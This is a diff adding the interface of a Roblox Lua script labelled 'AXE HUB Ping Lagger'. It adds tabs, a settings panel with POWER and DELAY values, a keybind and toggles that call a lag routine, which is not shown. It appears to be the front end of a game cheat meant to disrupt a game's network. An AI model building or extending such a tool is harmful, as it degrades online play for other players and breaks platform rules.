+local stopAllBtn = Instance.new("TextButton")
+stopAllBtn.Size = UDim2.new(1, 0, 0, 30)
+stopAllBtn.Position = UDim2.new(0, 0, 0, #SONGS * 78 + 4)
+stopAllBtn.BackgroundColor3 = C.off
+stopAllBtn.Text = "STOP ALL"
+stopAllBtn.TextColor3 = C.white
+stopAllBtn.TextSize = 12
+stopAllBtn.Font = Enum.Font.GothamBlack
+stopAllBtn.ZIndex = 57
+stopAllBtn.Parent = songsPage
+corner(stopAllBtn, 8)
+stroke(stopAllBtn, C.stroke, 1, 0.35)
+stopAllBtn.MouseButton1Click:Connect(function()
+	stopAllSongs()
+	refreshAllSongToggles()
+end)
+
+-- TAB SWITCH
+local function showTab(id)
+	currentTab = id
+	mainPage.Visible = (id == "main")
+	songsPage.Visible = (id == "songs")
+	if id == "main" then
+		tabMain.BackgroundColor3 = C.accent
+		tabMain.TextColor3 = C.bg
+		tabSongs.BackgroundColor3 = C.bg
+		tabSongs.TextColor3 = C.muted
+	else
+		tabSongs.BackgroundColor3 = C.accent
+		tabSongs.TextColor3 = C.bg
+		tabMain.BackgroundColor3 = C.bg
+		tabMain.TextColor3 = C.muted
+	end
+end
+tabMain.MouseButton1Click:Connect(function() showTab("main") end)
+tabSongs.MouseButton1Click:Connect(function() showTab("songs") end)
+
+-- ═══════════════════════════════════════
+-- SETTINGS PANEL
+-- ═══════════════════════════════════════
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Size = UDim2.new(0, 260, 0, 268)
+settingsFrame.Position = UDim2.new(0.5, -130, 0.5, -115)
+settingsFrame.BackgroundColor3 = C.bg
+settingsFrame.BackgroundTransparency = 0.12
+settingsFrame.BorderSizePixel = 0
+settingsFrame.Visible = false
+settingsFrame.ZIndex = 60
+settingsFrame.Parent = screenGui
+corner(settingsFrame, 12)
+stroke(settingsFrame, C.accent, 1.5, 0.3)
+makeDraggable(settingsFrame, function() return uiLocked end)
+
+local setHeader = Instance.new("Frame")
+setHeader.Size = UDim2.new(1, 0, 0, 36)
+setHeader.BackgroundColor3 = C.card
+setHeader.BackgroundTransparency = 0.25
+setHeader.BorderSizePixel = 0
+setHeader.Parent = settingsFrame
+corner(setHeader, 12)
+
+local setTitle = Instance.new("TextLabel")
+setTitle.Size = UDim2.new(1, -40, 1, 0)
+setTitle.Position = UDim2.new(0, 12, 0, 0)
+setTitle.BackgroundTransparency = 1
+setTitle.Text = "⚙ SETTINGS"
+setTitle.TextColor3 = C.accentLit
+setTitle.TextSize = 13
+setTitle.Font = Enum.Font.GothamBlack
+setTitle.TextXAlignment = Enum.TextXAlignment.Left
+setTitle.ZIndex = 65
+setTitle.Parent = setHeader
+
+local closeSetBtn = Instance.new("TextButton")
+closeSetBtn.Size = UDim2.new(0, 28, 0, 28)
+closeSetBtn.Position = UDim2.new(1, -32, 0, 4)
+closeSetBtn.BackgroundColor3 = C.card
+closeSetBtn.Text = "✕"
+closeSetBtn.TextColor3 = C.muted
+closeSetBtn.TextSize = 14
+closeSetBtn.Font = Enum.Font.GothamBold
+closeSetBtn.ZIndex = 65
+closeSetBtn.Parent = setHeader
+corner(closeSetBtn, 6)
+
+local verRow = Instance.new("Frame")
+verRow.Size = UDim2.new(1, -20, 0, 30)
+verRow.Position = UDim2.new(0, 10, 0, 45)
+verRow.BackgroundTransparency = 1
+verRow.ZIndex = 65
+verRow.Parent = settingsFrame
+
+local verLayout = Instance.new("UIListLayout")
+verLayout.FillDirection = Enum.FillDirection.Horizontal
+verLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+verLayout.Padding = UDim.new(0, 6)
+verLayout.Parent = verRow
+
+local verButtons = {}
+local function updateVerVisuals()
+	for v, btn in pairs(verButtons) do
+		local selected = (cfg.version == v)
+		btn.BackgroundColor3 = selected and C.accent or C.card
+		btn.TextColor3 = selected and C.bg or C.muted
+		local s = btn:FindFirstChildOfClass("UIStroke")
+		if s then s.Transparency = selected and 0.1 or 0.55 end
+	end
+	if statusLbl then statusLbl.Text = "" end
+end
+
+for _, v in ipairs({ 1, 2, 3 }) do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 70, 0, 28)
+	btn.BackgroundColor3 = C.card
+	btn.BorderSizePixel = 0
+	btn.Text = "V" .. v
+	btn.TextColor3 = C.muted
+	btn.TextSize = 12
+	btn.Font = Enum.Font.GothamBold
+	btn.ZIndex = 66
+	btn.Parent = verRow
+	corner(btn, 6)
+	stroke(btn, C.stroke, 1, 0.55)
+	btn.MouseButton1Click:Connect(function()
+		cfg.version = v
+		saveConfig()
+		updateVerVisuals()
+		if active then setLag(false); setLag(true) end
+	end)
+	verButtons[v] = btn
+end
+updateVerVisuals()
+
+local function makeSettingRow(parent, label, y, defaultText, callback)
+	local row = Instance.new("Frame")
+	row.Size = UDim2.new(1, -20, 0, 32)
+	row.Position = UDim2.new(0, 10, 0, y)
+	row.BackgroundTransparency = 1
+	row.ZIndex = 65
+	row.Parent = parent
+
+	local lbl = Instance.new("TextLabel")
+	lbl.Size = UDim2.new(0, 60, 1, 0)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = label
+	lbl.TextColor3 = C.accentLit
+	lbl.TextSize = 11
+	lbl.Font = Enum.Font.GothamBold
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	lbl.ZIndex = 66
+	lbl.Parent = row
+
+	local box = Instance.new("TextBox")
+	box.Size = UDim2.new(1, -70, 0, 26)
+	box.Position = UDim2.new(0, 70, 0.5, -13)
+	box.BackgroundColor3 = C.card
+	box.BackgroundTransparency = 0.25
+	box.TextColor3 = C.white
+	box.TextSize = 12
+	box.Font = Enum.Font.GothamBold
+	box.Text = defaultText
+	box.ClearTextOnFocus = false
+	box.ZIndex = 66
+	box.Parent = row
+	corner(box, 6)
+	stroke(box, C.stroke, 1, 0.5)
+	box.FocusLost:Connect(function() callback(box.Text) end)
+	return box
+end
+
+makeSettingRow(settingsFrame, "POWER", 80, tostring(cfg.power), function(text)
+	local num = tonumber(text)
+	if num and num >= 1 then
+		cfg.power = math.floor(num)
+		saveConfig()
+		if active then setLag(false); setLag(true) end
+	end
+end)
+
+makeSettingRow(settingsFrame, "DELAY", 118, tostring(cfg.interval), function(text)
+	local num = tonumber(text)
+	if num and num >= 0.01 then
+		cfg.interval = num
+		saveConfig()
+		if active then setLag(false); setLag(true) end
+	end
+end)
+
+local kbRow = Instance.new("Frame")
+kbRow.Size = UDim2.new(1, -20, 0, 32)
+kbRow.Position = UDim2.new(0, 10, 0, 156)
+kbRow.BackgroundTransparency = 1
+kbRow.ZIndex = 65
+kbRow.Parent = settingsFrame
+
+local kbLbl = Instance.new("TextLabel")
+kbLbl.Size = UDim2.new(0, 60, 1, 0)
+kbLbl.BackgroundTransparency = 1
+kbLbl.Text = "KEY"
+kbLbl.TextColor3 = C.accentLit
+kbLbl.TextSize = 11
+kbLbl.Font = Enum.Font.GothamBold
+kbLbl.TextXAlignment = Enum.TextXAlignment.Left
+kbLbl.ZIndex = 66
+kbLbl.Parent = kbRow
+
+local kbBtn = Instance.new("TextButton")
+kbBtn.Size = UDim2.new(1, -70, 0, 26)
+kbBtn.Position = UDim2.new(0, 70, 0.5, -13)
+kbBtn.BackgroundColor3 = C.card
+kbBtn.BackgroundTransparency = 0.25
+kbBtn.Text = cfg.keybind
+kbBtn.TextColor3 = C.accent
+kbBtn.TextSize = 12
+kbBtn.Font = Enum.Font.GothamBold
+kbBtn.ZIndex = 66
+kbBtn.Parent = kbRow
+corner(kbBtn, 6)
+stroke(kbBtn, C.stroke, 1, 0.5)
+
+kbBtn.MouseButton1Click:Connect(function()
+	listeningFor = true
+	kbBtn.Text = "..."
+	kbBtn.TextColor3 = C.glow
+end)
+
+local autoRow = Instance.new("Frame")
+autoRow.Size = UDim2.new(1, -20, 0, 32)
+autoRow.Position = UDim2.new(0, 10, 0, 190)
+autoRow.BackgroundTransparency = 1
+autoRow.ZIndex = 65
+autoRow.Parent = settingsFrame
+
+local autoLbl = Instance.new("TextLabel")
+autoLbl.Size = UDim2.new(0, 80, 1, 0)
+autoLbl.BackgroundTransparency = 1
+autoLbl.Text = "AUTO ACT"
+autoLbl.TextColor3 = C.accentLit
+autoLbl.TextSize = 11
+autoLbl.Font = Enum.Font.GothamBold
+autoLbl.TextXAlignment = Enum.TextXAlignment.Left
+autoLbl.ZIndex = 66
+autoLbl.Parent = autoRow
+
+local toggleTrack = Instance.new("Frame")
+toggleTrack.Size = UDim2.new(0, 44, 0, 22)
+toggleTrack.Position = UDim2.new(0, 70, 0.5, -11)
+toggleTrack.BackgroundColor3 = cfg.autoBrainrot and C.accent or C.card
+toggleTrack.BorderSizePixel = 0
+toggleTrack.ZIndex = 66
+toggleTrack.Parent = autoRow
+corner(toggleTrack, 11)
+stroke(toggleTrack, C.stroke, 1, 0.4)
+
+local toggleKnob = Instance.new("Frame")
+toggleKnob.Size = UDim2.new(0, 16, 0, 16)
+toggleKnob.Position = cfg.autoBrainrot and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+toggleKnob.BackgroundColor3 = C.white
+toggleKnob.BorderSizePixel = 0
+toggleKnob.ZIndex = 67
+toggleKnob.Parent = toggleTrack
+corner(toggleKnob, 8)
+
+local toggleHit = Instance.new("TextButton")
+toggleHit.Size = UDim2.new(1, 0, 1, 0)
+toggleHit.BackgroundTransparency = 1
+toggleHit.Text = ""
+toggleHit.ZIndex = 68
+toggleHit.Parent = toggleTrack
+
+toggleHit.MouseButton1Click:Connect(function()
+	cfg.autoBrainrot = not cfg.autoBrainrot
+	local goalPos = cfg.autoBrainrot and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+	local goalColor = cfg.autoBrainrot and C.accent or C.card
+	TweenService:Create(toggleKnob, TweenInfo.new(0.2), { Position = goalPos }):Play()
+	TweenService:Create(toggleTrack, TweenInfo.new(0.2), { BackgroundColor3 = goalColor }):Play()
+	saveConfig()
+end)
+
+local saveBtn = Instance.new("TextButton")
+saveBtn.Size = UDim2.new(1, -20, 0, 32)
+saveBtn.Position = UDim2.new(0, 10, 1, -40)
+saveBtn.BackgroundColor3 = C.accent
+saveBtn.Text = "SAVE"
+saveBtn.TextColor3 = C.bg
+saveBtn.TextSize = 13
+saveBtn.Font = Enum.Font.GothamBlack
+saveBtn.ZIndex = 66
+saveBtn.Parent = settingsFrame
+corner(saveBtn, 8)
+stroke(saveBtn, C.stroke, 1.2, 0.25)
+saveBtn.MouseButton1Click:Connect(function()
+	saveConfig()
+	local prev = saveBtn.Text
+	saveBtn.Text = "SAVED"
+	saveBtn.BackgroundColor3 = C.on
+	saveBtn.TextColor3 = C.white
+	task.delay(0.85, function()
+		if saveBtn and saveBtn.Parent then
+			saveBtn.Text = prev
+			saveBtn.BackgroundColor3 = C.accent
+			saveBtn.TextColor3 = C.bg
+		end
+	end)
+end)
+
+-- ═══════════════════════════════════════
+-- INTERACTIONS
+-- ═══════════════════════════════════════
+makeDraggable(frame, function() return uiLocked end)
+
+local function refreshLagBtn()
+	if active then
+		lagBtn.Text = "DEACTIVATE"
+		lagBtn.TextColor3 = C.white
+		lagBtn.BackgroundColor3 = C.on
+		if statusLbl then statusLbl.Text = "" end
+	else
+		lagBtn.Text = "ACTIVATE"
+		lagBtn.TextColor3 = C.accent
+		lagBtn.BackgroundColor3 = C.bg
+		if statusLbl then statusLbl.Text = "" end
+	end
+end
+
+lagBtn.MouseButton1Click:Connect(function()
+	active = not active
+	setLag(active)
+	refreshLagBtn()
+end)
+
+lockBtn.MouseButton1Click:Connect(function()
+	uiLocked = not uiLocked
+	lockBtn.Text = uiLocked and "🔒" or "🔓"
+	lockBtn.TextColor3 = uiLocked and C.off or C.white
+end)
+
+local function toggleSettings()
+	settingsOpen = not settingsOpen
+	if settingsOpen then
+		settingsFrame.Visible = true
+		settingsFrame.BackgroundTransparency = 1
+		TweenService:Create(settingsFrame, TweenInfo.new(0.28, Enum.EasingStyle.Back), {
+			BackgroundTransparency = 0.12,
+		}):Play()
+	else
+		TweenService:Create(settingsFrame, TweenInfo.new(0.18), { BackgroundTransparency = 1 }):Play()
+		task.delay(0.18, function() settingsFrame.Visible = false end)
+	end
+end
+gearBtn.MouseButton1Click:Connect(toggleSettings)
+closeSetBtn.MouseButton1Click:Connect(toggleSettings)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+	local kc = input.KeyCode
+	if kc == Enum.KeyCode.Unknown then return end
+	if listeningFor then
+		if kc == Enum.KeyCode.Escape then
+			listeningFor = false
+			kbBtn.Text = cfg.keybind
+			kbBtn.TextColor3 = C.accent
+			return
+		end
+		if kc ~= Enum.KeyCode.LeftControl then
+			cfg.keybind = kc.Name
+			listeningFor = false
+			kbBtn.Text = cfg.keybind
+			kbBtn.TextColor3 = C.accent
+			saveConfig()
+		end
+		return
+	end
+	if processed then return end
+	local keyEnum = resolveKey(cfg.keybind)
+	if keyEnum and kc == keyEnum then
+		active = not active
+		setLag(active)
+		refreshLagBtn()
+	end
+end)
+
+local function openMain()
+	TweenService:Create(modeSelector, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
+	task.delay(0.35, function()
+		modeSelector.Visible = false
+		frame.Visible = true
+		frame.BackgroundTransparency = 1
+		frame.Position = UDim2.new(0.5, -150, 0.58, 0)
+		TweenService:Create(frame, TweenInfo.new(0.45, Enum.EasingStyle.Back), {
+			BackgroundTransparency = 0.12,
+			Position = UDim2.new(0.5, -150, 0.5, -134),
+		}):Play()
+		showTab("main")
+		if cfg.songOn then setSongAt(1, true) refreshAllSongToggles() end
+	end)
+end
+
+mobBtn.MouseButton1Click:Connect(openMain)
+pcBtn.MouseButton1Click:Connect(openMain)
+
+applyGuiScale(cfg.guiScale or 1)
+compactMode = cfg.compactMode == true
+refreshCompactUI()
+
+if compactBtn then
+	compactBtn.MouseButton1Click:Connect(function()
+		compactMode = not compactMode
+		cfg.compactMode = compactMode
+		refreshCompactUI()
+		saveConfig()
+	end)
+end
+
+print("[AXE HUB] Ping Lagger loaded · Songs · GUI scale")
